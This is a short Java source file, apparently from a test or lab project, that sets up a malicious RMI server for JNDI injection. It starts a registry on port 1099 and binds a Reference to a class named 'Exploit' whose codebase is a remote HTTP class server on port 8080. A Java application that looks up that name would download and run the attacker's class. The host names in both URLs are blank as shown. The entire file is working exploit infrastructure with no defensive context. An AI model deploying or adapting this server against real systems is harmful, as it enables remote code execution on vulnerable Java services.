package com.test.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.InitialContext;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class ReferenceRMIServer {
    public static void main(String[] args) throws Exception{
        Registry registry = LocateRegistry.createRegistry(1099);
        String remote_class_server = "http://:8080";
        Reference reference = new Reference("Exploit", "Exploit", remote_class_server);

        //ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        //registry.bind("hh",referenceWrapper);

        InitialContext initialContext = new InitialContext();
        initialContext.rebind("rmi://:1099/hh",reference);
    }
}
